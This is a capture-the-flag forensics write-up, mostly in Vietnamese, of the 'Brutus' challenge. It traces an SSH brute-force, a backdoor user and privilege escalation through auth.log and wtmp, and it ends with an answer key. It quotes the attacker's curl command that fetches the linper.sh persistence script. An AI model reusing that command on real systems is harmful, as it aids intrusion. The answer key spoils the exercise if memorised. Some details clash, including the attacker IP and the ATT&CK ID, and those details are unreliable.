![image](https://hackmd.io/_uploads/r1pLwpx4Jg.png)

In this very easy Sherlock, you will familiarize yourself with Unix `auth.log` and `wtmp` logs. We’ll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

# Brutus
## Sherlock info
Name |Brutus
|-|-|
Difficulty| Very Easy
Category | DFIR|

## Note from Scenario
- Tập trung vào Confluence server.
- Kịch bản là cuộc tấn công brute-force qua SSH.
- Sau đó là leo quyền.

## Tools use
- utmpdump
- Notepad ++

>### Comment
>Vì đây là bài đầu tiên làm dạng mới này (chân trời mới) nên mình sẽ phân tích dài dòng, mục đích học là chủ yếu (bài này giống đi soi writeup rồi đem về vietsub :) ). Let's go

# Question 
1. Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?
2. The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?
3. Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?
4. SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker’s session for the user account from Question 2?
5. The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
6. What is the MITRE ATT&CK sub-technique ID used for persistence?
7. How long did the attacker’s first SSH session last based on the previously confirmed authentication time and session ending within the auth.log? (seconds)
8. The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

# Analysis
Unzip ra ta nhân được 2 tệp là `auth.log` và `wtmp`

![image](https://hackmd.io/_uploads/BkYiumMV1x.png)

## auth.log
File `auth.log` ghi lại cả lần đăng nhập thành công và thất bại, hành động sudo và su cũng như các quy trình liên quan đến xác thực khác. Trên hệ thống Debian/Ubuntu, nhật ký này được lưu trữ tại `/var/log/auth.log`, trong khi trên hệ thống RedHat/CentOS, nó được lưu trữ tại `/var/log/secure`. 

Nội dung của tệp `auth.log` của bài này như sau

![image](https://hackmd.io/_uploads/HJ-mPXzVke.png)

Các trường có thể phân tích là:
```
Mar  6 06:18:01 ip-172-31-35-28 CRON[1119]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
```
- Date/Time: March 6 at 06\:18:01
- IP: ip-172–31–35–28
- Service: The cron service
- Process ID (PID): 1119
- Message: Service CRON đã mở một phiên làm việc cho người dùng `confluence` (UID 998), được khởi tạo bởi `root` (uid=0).

## wtmp
File `wtmp` là một trong ba tệp được sử dụng để ghi nhật ký các sự kiện đăng nhập và đăng xuất trên hệ thống Linux. Ở đây `wtmp` lưu giữ bản ghi lịch sử về các sự kiện đăng nhập và đăng xuất.

File này là định dạng binary nên phải dùng tool mới đọc được

![image](https://hackmd.io/_uploads/HJduoXzEyl.png)

Tool sẽ sử dụng để đọc đươc file này `utmpdump`

![image](https://hackmd.io/_uploads/SyyR6QGEJx.png)

Các trường có thể phân tích là:
```
[7] [01284] [ts/0] [ubuntu] [pts/0] [203.101.190.9] [203.101.190.9] [2024-01-25T11:13:58,354674+00:00]

[6] [838568] [tyS0] [LOGIN] [ttyS0] [            ] [0.0.0.0] [2024-02-11T10:39:02,172417+00:00]
```
- **Event Type**: \[7]
- **PID (Process ID)**: \[01284]
- **Terminal ID**: \[ts/0] và \[pts/0] (thường đươc chỉ định là **ssh**)
- **Action**: \[LOGIN]
- **User**: \[ubuntu]
- **Host**: \[203.101.190.9]
- **IP Address**: \[203.101.190.9]
- **Timestamp**: \[2024-01-25T11\:12:31,072401+00:00]

## SSH Brute Force
Để điều tra một cuộc tấn công **Brute-force** qua SSH, ta sẽ bắt đầu bằng cách kiểm tra các lần đăng nhập không thành công vì những lần đăng nhập này sẽ không xuất hiện trong file `wtmp`. Để làm điều này ta sẽ đọc file `auth.log`

![image](https://hackmd.io/_uploads/SkPVFVMVyl.png)

Sử dụng notepad++ ta thấy từ dòng 1- 10, 16 - 50 đại diện và các chuỗi hoạt động tương tự là hoạt động được cho là bình thường, user root (UID=0) đã mở một phiên làm việc cho user `confluence`

![image](https://hackmd.io/_uploads/rJn39Vf4yx.png)

Tuy nhiên tại dòng 11 - 15 ta thấy có chuỗi sự kiện trên cho thấy một đăng nhập SSH thành công của user `root` từ `203.101.190.9`. Mặc dù có lỗi với lệnh xác thực khóa công khai (`AuthorizedKeysCommand`), việc xác thực mật khẩu đã thành công và một phiên làm việc được mở cho user `root`. Ta sẽ lưu ý điều này sau

![image](https://hackmd.io/_uploads/Hy8ZnVGNyg.png)

Từ 68 đổ đi đã có dâu hiệu bất thường khi IP **65.2.141.68** liên tục đăng nhập vào với việc thử username (admin, svc_account, server_adm, backup) và password. Đây chắc chắn là tấn công **brute-force**

![image](https://hackmd.io/_uploads/Sk8-9CfEkl.png)

![image](https://hackmd.io/_uploads/HyBO5AG4Jl.png)

Việc tấn công diễn ra từ **6\:31:39** đến **6\:31:39** thì attacker đã brute-force thành công với username là **root**. Từ **6\:32:44**ta thấy một phiên mới là **37** đã được tạo (login thành công)

![image](https://hackmd.io/_uploads/SkxhARzEyg.png)

![image](https://hackmd.io/_uploads/BkZmARfNJe.png)

## Root Session
Từ thời điểm tra ta sẽ quay lại kiểm tra file `wtmp`. Đây chính là thời gian thực trùng với thời gian file `auth.log` ghi nhận mà hệ thống trên linux ghi nhận. **2024-03-06 06\:32:45**

![image](https://hackmd.io/_uploads/HkAaC0GVJl.png)

Các loại log khác được quan sát trong `auth.log` ngoài SSH và CRON bao gồm sudo, groupadd, usermod, systemd, useradd, passwd và chfn. Vào lúc **06\:34:18**, ta thấy việc addgroup với **cyberjunkie**. Ngay sau đó, pass và user được cập nhật

![image](https://hackmd.io/_uploads/H1dA1y7Eyx.png)

Việc tạo account, add vào localgroup để tạo persistent là kỹ thuât [T1136.01](https://attack.mitre.org/techniques/T1136/001/) trong MITRE

Phiên ngắt kết nối ngay sau đó, với tổng thời lượng phiên được ghi là **06\:32:45** đến **06\:37:24**, tổng cộng là **279** giây

![image](https://hackmd.io/_uploads/HkQoe1XNyg.png)

## Cyberjunkie Session
Sau khi có user thuộc localgroup, attacker thực hiện các chuỗi hành động leo quyền như đọc file `/etc/shadow` và tải `linper.sh` (kiểm tra lỗi config của máy linux để leo quyền)

```
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

![image](https://hackmd.io/_uploads/SyhlZ1mEke.png)

Cuối cùng thì attacker cũng leo quyền thành công. Kết thúc bài : )

![image](https://hackmd.io/_uploads/r1xJGkXNyl.png)

# Answer
1. 65.2.161.68
2. root
3. 2024–03–06 06:32:45
4. 37
5. cyberjunkie
6. T1136.001
7. 279
8. /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

![image](https://hackmd.io/_uploads/HJbI5TxV1e.png)
